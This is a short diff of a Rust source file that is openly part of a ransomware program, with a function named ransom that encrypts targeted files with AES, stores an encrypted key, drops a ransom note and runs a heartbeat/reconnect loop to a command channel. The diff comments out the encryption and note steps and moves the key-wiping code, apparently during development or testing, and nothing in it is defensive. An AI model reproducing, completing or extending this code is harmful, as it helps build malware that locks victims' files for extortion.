@@ -6,7 +6,7 @@ use std::sync::Arc;
 use tokio::sync::{Mutex, mpsc};
 
 
-use crate::communication::comm::channel::CommChannel;
+use crate::communication::channels::channel::CommChannel;
 use crate::core::agent_state::AgentState;
 use crate::utils::{logger, note, config::AppConfig};
 use crate::core::targeting;
@@ -61,18 +61,18 @@ pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig, comm_channe
         agent_state.offline_mode_key(&encrypted_key).await;
     }
 
-    // Step 6: Encrypt files
-    if let Err(e) = encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
-        logger.log(&format!("Error during encryption: {}", e));
-    }
+    // // Step 6: Encrypt files
+    // if let Err(e) = encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
+    //     logger.log(&format!("Error during encryption: {}", e));
+    // }
 
-    // Step 7: Wipe key material
-    aes_key.zeroize();
-    aes_iv.zeroize();
-    encrypted_key.zeroize();
+    // // Step 7: Display ransom note
+    // let _ = note::generate_note(&logger, &config.note_path);
 
-    // Step 8: Display ransom note
-    let _ = note::generate_note(&logger, &config.note_path);
+     // Step 8: Wipe key material
+     aes_key.zeroize();
+     aes_iv.zeroize();
+     encrypted_key.zeroize();
 
     // Step 9: Heartbeat / reconnect loop
     loop {
